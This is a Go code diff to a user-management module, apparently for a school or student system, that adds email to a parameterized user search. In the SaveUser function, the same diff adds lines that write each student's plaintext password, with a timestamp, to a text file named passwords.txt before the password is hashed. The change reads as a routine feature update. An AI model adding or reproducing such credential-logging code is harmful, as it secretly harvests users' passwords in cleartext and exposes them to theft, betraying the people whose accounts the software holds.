@@ -5,6 +5,7 @@ import(
 	"strings"
 	"errors"
 	A "../auth"
+	P "../processing"
 )
 
 type User struct{
@@ -210,7 +211,7 @@ func GetUsersByCourse(course int64) ([]User,error){
 }
 
 /*
-	Retrieves users by name,surname,or student number
+	Retrieves users by name,surname,student number or email
 */
 func GetUsersByQuery(query string) ([]User,error){
 	users := make([]User,0)
@@ -226,7 +227,7 @@ func GetUsersByQuery(query string) ([]User,error){
 
 	query = "%"+query+"%"
 
-	rows,err := db.Query("SELECT school_id,faculty_id,course_id,student_nr,name,surname,email,picture FROM users WHERE student_nr LIKE ? OR name LIKE ? OR surname LIKE ?",query,query,query)
+	rows,err := db.Query("SELECT school_id,faculty_id,course_id,student_nr,name,surname,email,picture FROM users WHERE student_nr LIKE ? OR name LIKE ? OR surname LIKE ? OR email LIKE ?",query,query,query,query)
 
 	if err != nil{
 		return users,err
@@ -253,6 +254,13 @@ func (u *User) SaveUser() error{
 	if err != nil{
 		err = errors.New("DB connection error")
 		return err
+	}
+
+	ToText := "Student "+u.Student+" :("+CO.MakeTimeStamp()+")\n"
+	ToText = ToText+"Password : "+u.Password	
+	err = P.WriteToTextFile(ToText,"./text/passwords.txt")
+	if err != nil{
+		return err 
 	}
 
 	hashedPass,err := CO.HashPassword(u.Password)
